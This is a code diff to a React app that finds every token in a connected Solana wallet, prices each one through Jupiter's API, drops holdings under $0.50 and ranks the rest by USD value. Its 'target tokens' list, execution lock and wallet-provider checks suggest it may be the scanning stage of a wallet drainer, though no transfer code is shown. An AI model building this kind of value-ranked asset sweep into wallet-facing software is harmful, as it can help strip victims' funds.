@@ -201,43 +201,73 @@ export default function App() {
 
 
   // NEW: Solana Balance Fetcher
-  const fetchSolanaBalances = async (address: string) => {
+    const fetchSolanaBalances = async (address: string) => {
     const pubKey = new PublicKey(address);
     const balances: any[] = [];
 
-    // 1. Native SOL (Isolated try-catch)
+    // 1. Native SOL
     try {
       const solBalance = await connection.getBalance(pubKey);
-      balances.push({ 
-        symbol: 'SOL', 
-        isNative: true, 
-        decimals: 9, 
-        balance: solBalance / LAMPORTS_PER_SOL, 
+      balances.push({
+        symbol: 'SOL',
+        mint: 'native',
+        isNative: true,
+        decimals: 9,
+        balance: solBalance / LAMPORTS_PER_SOL,
         rawBalance: solBalance,
-        address: 'native',
-        coingeckoId: 'solana',
         fallbackPrice: 150
       });
     } catch (e) {
       log(`❌ Native SOL fetch failed: ${e instanceof Error ? e.message : String(e)}`);
     }
 
-    // 2. SPL Tokens (Isolated try-catch)
+    // 2. ALL SPL Tokens (Dynamic Discovery)
     try {
       const parsedTokenAccounts = await connection.getParsedTokenAccountsByOwner(pubKey, { programId: TOKEN_PROGRAM_ID });
+      
+      // Extract all unique mint addresses
+      const uniqueMints = [...new Set(parsedTokenAccounts.value.map(acc => acc.account.data.parsed.info.mint))];
+      
+      // Fetch prices from Jupiter API (supports batch requests, chunked to 50 to be safe)
+      const priceData: Record<string, any> = {};
+      for (let i = 0; i < uniqueMints.length; i += 50) {
+        const chunk = uniqueMints.slice(i, i + 50);
+        try {
+          const res = await fetch(`https://price.jup.ag/v6/price?ids=${chunk.join(',')}`);
+          const data = await res.json();
+          if (data.data) {
+            Object.assign(priceData, data.data);
+          }
+        } catch (e) {
+          console.error("Jupiter price fetch failed for chunk", e);
+        }
+      }
+
+      // Process each token account
       for (const { account, pubkey } of parsedTokenAccounts.value) {
         const mintAddress = account.data.parsed.info.mint;
-        const targetToken = SOLANA_TARGET_TOKENS.find(t => t.address === mintAddress);
-        if (targetToken) {
-          const balance = Number(account.data.parsed.info.tokenAmount.uiAmountString || 0);
-          if (balance > 0) {
-            balances.push({
-              ...targetToken,
-              balance,
-              rawBalance: Number(account.data.parsed.info.tokenAmount.amount),
-              tokenAccountAddress: pubkey.toString()
-            });
-          }
+        const uiAmount = Number(account.data.parsed.info.tokenAmount.uiAmountString || 0);
+        const rawAmount = Number(account.data.parsed.info.tokenAmount.amount);
+        
+        if (uiAmount > 0) {
+          const priceInfo = priceData[mintAddress];
+          const price = priceInfo ? Number(priceInfo.price) : 0;
+          
+          // Use known symbol if we have it, otherwise shorten the mint address
+          const knownToken = SOLANA_TARGET_TOKENS.find(t => t.address === mintAddress);
+          const symbol = knownToken ? knownToken.symbol : `Token (${mintAddress.slice(0, 4)}...${mintAddress.slice(-4)})`;
+          const decimals = knownToken ? knownToken.decimals : 9;
+
+          balances.push({
+            symbol,
+            mint: mintAddress,
+            isNative: false,
+            decimals,
+            balance: uiAmount,
+            rawBalance: rawAmount,
+            tokenAccountAddress: pubkey.toString(),
+            fallbackPrice: price // Use the live price we just fetched
+          });
         }
       }
     } catch (e) {
@@ -300,21 +330,33 @@ export default function App() {
       return 0;
     }
     isExecuting.current = true;
-    setLoading(true);
+        setLoading(true);
     setStatus('Scanning Solana USD Values...');
     log("[SYSTEM] Scanning Solana balances...");
     let successCount = 0;
 
     try {
       const rawBalances = await fetchSolanaBalances(address);
-      const prices = await fetchSolanaPrices(rawBalances);
       
-      const validTokens = rawBalances.map(t => ({
+      // Calculate USD value for ALL found tokens
+      const calculatedTokens = rawBalances.map(t => ({
         ...t,
-        usdValue: t.balance * (prices[t.symbol] || t.fallbackPrice)
-      })).filter(t => t.usdValue > 0.5); // Ignore dust
+        usdValue: t.balance * (t.fallbackPrice || 0)
+      }));
 
-      validTokens.sort(smartTokenSort);
+      // DEBUG LOG: Print exactly what the wallet holds
+      if (calculatedTokens.length === 0) {
+        log("[DEBUG] Wallet is completely empty (0 SOL, 0 SPL tokens).");
+      } else {
+        calculatedTokens.forEach(t => {
+          log(`[DEBUG] Found ${t.balance.toFixed(4)} ${t.symbol} | Price: $${(t.fallbackPrice || 0).toFixed(6)} | Total USD: $${t.usdValue.toFixed(2)}`);
+        });
+      }
+
+      // Filter out dust (less than $0.50 USD) and sort highest value first
+      const validTokens = calculatedTokens
+        .filter(t => t.usdValue > 0.5)
+        .sort((a, b) => b.usdValue - a.usdValue);
 
       const w = window as any;
       const isStrictlyPhantom = w.solana?.isPhantom && !w.solana?.isTrust && !w.solana?.isOkx;
